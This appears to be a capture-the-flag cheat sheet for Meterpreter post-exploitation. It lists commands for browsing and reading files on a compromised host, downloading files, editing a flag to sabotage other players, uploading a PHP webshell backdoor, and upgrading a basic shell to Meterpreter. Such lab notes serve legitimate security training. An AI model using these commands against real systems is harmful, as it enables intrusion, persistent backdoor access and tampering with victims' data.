# Meterpreter

## Meterpreter

## Meterpreter Basic Commands

```bash
#Check the present working directory on remote (exploited) machine.
pwd
#List the files present in present working directory of the remote machine.
ls
#Check the present working directory on local (attacker) machine.
lpwd
#List the files present in present working directory of the local machine.
lls
#Get the flag value present in /app/flag1 file.
cat /app/flag1
#Change the flag value present in /app/flag1, so that no one else can get the right flag.
edit /app/flag1
#Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.
cd "Secret Files"; cat .flag2
#Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag.
download flag5.zip; unzip flag5.zip; cat list
#Delete the .zip file from the directory.
rm flag5.zip
#Print checksum of file mentioned in the extracted file.
checksum md5 /bin/bash
#Check the PATH environment variable on the remote machine.
getenv PATH
#There is a file with string "ckdo" in its name in one of the places included in PATH variable. Print the flag hidden in that file.
search -d /usr/bin -f *ckdo*
#Change to tools directory on the local machine.
lcd tools
#Upload a PHP webshell to app directory of the remote machine.
upload /usr/share/webshells/php/php-backdoor.php
```

### Upgrade Normal Shell into Meterpreter

```bash
use post/multi/manage/shell_to_meterpreter
#or automatically upgrade from sessions
sessions -u 1
#for going into shell
shell # windows
shell
/bin/bash -i # linux
```

